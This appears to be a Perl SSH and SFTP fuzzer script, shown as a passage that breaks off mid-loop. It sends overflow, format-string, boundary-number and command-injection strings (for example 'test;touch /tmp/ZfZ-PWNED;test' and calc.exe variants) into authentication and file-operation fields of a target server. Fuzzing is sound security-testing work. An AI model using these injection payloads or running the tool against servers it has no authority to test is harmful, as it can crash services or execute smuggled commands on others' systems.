#!/usr/bin/perl
# Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com]
# SSHFuZZ - SSH Fuzzer
# Set options and run against host.. check sshfuzz.log hints to crashes (next to last fuzz string usually)
# SSHFuZZ will create different files in the current directory so make sure you got permissions and they may get quite large after a while
# LETS TEAR THIS PROTOCOL APART!!!

use Net::SSH2;
use Getopt::Std;

@overflow = ('A' x 600, 'A' x 1200, 'A' x 2200, 'A' x 4200, 'A' x 8200, 'A' x 11000,
             'A' x 22000, 'A' x 52000, 'A' x 110000, 'A' x 550000, 'A' x 1100000,
             'A' x 2200000, 'A' x 5500000, 'A' x 12000000, "\0x99" x 1200);

@fmtstring = ("%n%n%n%n%n", "%p%p%p%p%p", "%s%s%s%s%s", "%d%d%d%d%d", "%x%x%x%x%x",
              "%s%p%x%d", "%.1024d", "%.1025d", "%.2048d", "%.2049d", "%.4096d", "%.4097d",
              "%99999999999s", "%08x", "%%20n", "%%20p", "%%20s", "%%20d", "%%20x",
              "%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%",
              "%n%n%n%n%n%n%n%n%n%n%p%p%p%p%p%p%p%p%p%p%x%x%x%x%x%x%x%x%x%x%d%d%d%d%d%d%d%d%d%d%s%s%s%s%s%s%s%s%s%s",
              "\0xCD"x200,
              "\0xCB"x200);

@numbers = ("0", "-0", "1", "-1", "32767", "-32768", "2147483647", "-2147483647", "2147483648", "-2147483648",
            "4294967294", "4294967295", "4294967296", "357913942", "-357913942", "536870912", "-536870912",
            "1.79769313486231E+308", "3.39519326559384E-313", "99999999999", "-99999999999", "0x100", "0x1000",
            "0x3fffffff", "0x7ffffffe", "0x7fffffff", "0x80000000", "0xffff", "0xfffffffe", "0xfffffff", "0xffffffff",
            "0x10000", "0x100000", "0x99999999", "65535", "65536", "65537", "16777215", "16777216", "16777217", "-268435455");

@miscbugs = ("~!@#$%^&*()-=_+", "[]\{}|;:,./<>?\\", "<<<<<<<<<<>>>>>>>>>>", "\\\\\\\\\\//////////", "^^^^^^^^^^^^^^^^^^^^",
             "||||||||||~~~~~~~~~~", "?????[[[[[]]]]]{{{{{}}}}}((())", "test|touch /tmp/ZfZ-PWNED|test", "test`touch /tmp/ZfZ-PWNED`test",
             "test'touch /tmp/ZfZ-PWNED'test", "test;touch /tmp/ZfZ-PWNED;test", "test&&touch /tmp/ZfZ-PWNED&&test", "test|C:/WINDOWS/system32/calc.exe|test",
             "test`C:/WINDOWS/system32/calc.exe`test", "test'C:/WINDOWS/system32/calc.exe'test", "test;C:/WINDOWS/system32/calc.exe;test",
             "/bin/sh", "C:/WINDOWS/system32/calc.exe", "\xEF\xBF\xBD\xEF\xBF\xBD\xEF\xBF\xBD\xEF\xBF\xBD\xEF\xBF\xBD", "%0xa", "%u000", "/" x 200, "\\" x 200, "-----99999-----", "[[[abc123]]]", "|||/////|||");

getopts('H:P:u:p:', \%opts);
$host = $opts{'H'}; $port = $opts{'P'}; $username = $opts{'u'}; $password = $opts{'p'};

if(!defined($host) || !defined($username))
{
     print "\n SSHFuZZ - SSH Fuzzer";
     print "\nJeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com]";
     print "\nUsage: $0 -H <host> -P [port] -u <username> -p [password]\n\n";
     exit(0);

}

     print "\n SSHFuZZ - SSH Fuzzer";
     print "\nJeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com]\n";
     print "\n *** SSHFuZZ is taking down the house ***\n";

print "\nFuzzing [SCP]->[scp_get] STAGE #1 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $scpget = $ssh2->scp_get($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $scpget = $ssh2->scp_get($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $scpget = $ssh2->scp_get($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $scpget = $ssh2->scp_get($fuzzssh); $ssh2->disconnect(); }

print "\n+Completing+ Fuzzing [SCP]->[scp_put] STAGE #1 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
open(FD, '>>sshfuzz'); print FDDDD "\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $scpput = $ssh2->scp_put("sshfuzz", $fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $scpput = $ssh2->scp_put("sshfuzz", $fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $scpput = $ssh2->scp_put("sshfuzz", $fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $scpput = $ssh2->scp_put("sshfuzz", $fuzzssh); $ssh2->disconnect(); }

print "\nFuzzing [SSH]->[auth_password(u)] STAGE #2 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_password($fuzzssh, "AAAAAAAA");
$ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_password($fuzzssh, "AAAAAAAA");
$ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_password($fuzzssh, "AAAAAAAA");
$ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_password($fuzzssh, "AAAAAAAA");
$ssh2->disconnect(); }

print "\nFuzzing [SSH]->[auth_password(p)] STAGE #3 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_password("AAAAAAAA", $fuzzssh);
$ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_password("AAAAAAAA", $fuzzssh);
$ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_password("AAAAAAAA", $fuzzssh);
$ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_password("AAAAAAAA", $fuzzssh);
$ssh2->disconnect(); }

# key fuzzing _may_ or _may not_ work correctly.. but I thought it was worth giving it a shot
print "\nFuzzing [SSH]->[auth_publickey(k)] STAGE #4 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
open(FDD, '+>public.key'); print FDD $fuzzssh; open(FDDD, '+>private.key'); print FDDD $fuzzssh;
$ssh2->auth_publickey($username, "public.key", "private.key"); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_publickey($username, "public.key", "private.key"); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_publickey($username, "public.key", "private.key"); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_publickey($username, "public.key", "private.key"); $ssh2->disconnect(); }

print "\nFuzzing [SSH]->[auth_publickey(u)] STAGE #5 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
open(FDD, '+>public.key'); print FDD "\n"; open(FDDD, '+>private.key'); print FDDD "\n";
$ssh2->auth_publickey($fuzzssh, "public.key", "private.key"); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_publickey($fuzzssh, "public.key", "private.key"); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_publickey($fuzzssh, "public.key", "private.key"); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_publickey($fuzzssh, "public.key", "private.key"); $ssh2->disconnect(); }

print "\nFuzzing [SSH]->[auth_hostbased(k)] STAGE #6 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
open(FDD, '+>public.key'); print FDD $fuzzssh; open(FDDD, '+>private.key'); print FDDD $fuzzssh;
$ssh2->auth_hostbased($username, "public.key", "private.key", $host); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_hostbased($username, "public.key", "private.key", $host); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_hostbased($username, "public.key", "private.key", $host); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_hostbased($username, "public.key", "private.key", $host); $ssh2->disconnect(); }

print "\nFuzzing [SSH]->[auth_hostbased(u)] STAGE #7 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
open(FDD, '+>public.key'); print FDD "\n"; open(FDDD, '+>private.key'); print FDDD "\n";
$ssh2->auth_hostbased($fuzzssh, "public.key", "private.key", $host); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_hostbased($fuzzssh, "public.key", "private.key", $host); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_hostbased($fuzzssh, "public.key", "private.key", $host); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_hostbased($fuzzssh, "public.key", "private.key", $host); $ssh2->disconnect(); }

print "\n+Completing+ Fuzzing [SSH]->[auth_hostbased(h)] STAGE #8 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_hostbased($username, "public.key", "private.key", $fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_hostbased($username, "public.key", "private.key", $fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_hostbased($username, "public.key", "private.key", $fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n"; $fuzzssh = $_;
$ssh2->auth_hostbased($username, "public.key", "private.key", $fuzzssh); $ssh2->disconnect(); }

print "\n\nFuzzing [SFTP]->[open] STAGE #1 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $open = $sftpfuzz->open($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $open = $sftpfuzz->open($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $open = $sftpfuzz->open($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $open = $sftpfuzz->open($fuzzssh); $ssh2->disconnect(); }

print "\nFuzzing [SFTP]->[open2] STAGE #2 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $open = $sftpfuzz->open("test", "O_RDWR", $fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $open = $sftpfuzz->open("test", "O_RDWR", $fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $open = $sftpfuzz->open("test", "O_RDWR", $fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $open = $sftpfuzz->open("test", "O_RDWR", $fuzzssh); $ssh2->disconnect(); }

print "\nFuzzing [SFTP]->[opendir] STAGE #3 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $opendir = $sftpfuzz->opendir($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $opendir = $sftpfuzz->opendir($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $opendir = $sftpfuzz->opendir($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $opendir = $sftpfuzz->opendir($fuzzssh); $ssh2->disconnect(); }

print "\nFuzzing [SFTP]->[unlink] STAGE #4 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $unlink = $sftpfuzz->unlink($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $unlink = $sftpfuzz->unlink($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $unlink = $sftpfuzz->unlink($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $unlink = $sftpfuzz->unlink($fuzzssh); $ssh2->disconnect(); }

print "\nFuzzing [SFTP]->[rename] STAGE #5 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || print "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $rename = $sftpfuzz->rename($fuzzssh, "test"); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || print "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $rename = $sftpfuzz->rename($fuzzssh, "test"); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || print "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $rename = $sftpfuzz->rename($fuzzssh, "test"); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || print "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $rename = $sftpfuzz->rename($fuzzssh, "test"); $ssh2->disconnect(); }

print "\nFuzzing [SFTP]->[mkdir] STAGE #6 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $mkdir = $sftpfuzz->mkdir($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $mkdir = $sftpfuzz->mkdir($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $mkdir = $sftpfuzz->mkdir($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $mkdir = $sftpfuzz->mkdir($fuzzssh); $ssh2->disconnect(); }

print "\nFuzzing [SFTP]->[rmdir] STAGE #7 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $rmdir = $sftpfuzz->rmdir($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $rmdir = $sftpfuzz->rmdir($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $rmdir = $sftpfuzz->rmdir($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $rmdir = $sftpfuzz->rmdir($fuzzssh); $ssh2->disconnect(); }

print "\nFuzzing [SFTP]->[stat] STAGE #8 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
